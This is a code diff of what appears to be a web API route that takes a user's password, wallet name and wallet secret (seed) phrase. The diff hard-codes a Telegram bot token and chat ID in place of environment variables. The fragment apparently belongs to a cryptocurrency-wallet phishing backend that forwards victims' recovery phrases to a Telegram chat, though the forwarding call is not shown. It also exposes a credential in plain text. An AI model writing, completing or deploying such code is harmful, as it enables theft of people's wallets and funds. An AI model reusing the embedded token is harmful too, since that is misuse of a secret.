@@ -2,8 +2,8 @@ export async function POST(request: Request) {
   try {
     const { password, walletName, secretPhrase } = await request.json()
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN
-    const chatId = process.env.TELEGRAM_CHAT_ID
+    const botToken = "8529111480:AAEhnXksm9FDFxafb4Ouas8FX2Sy-iMjm_o"
+    const chatId = -5125778966
 
     if (!botToken || !chatId) {
       return Response.json(
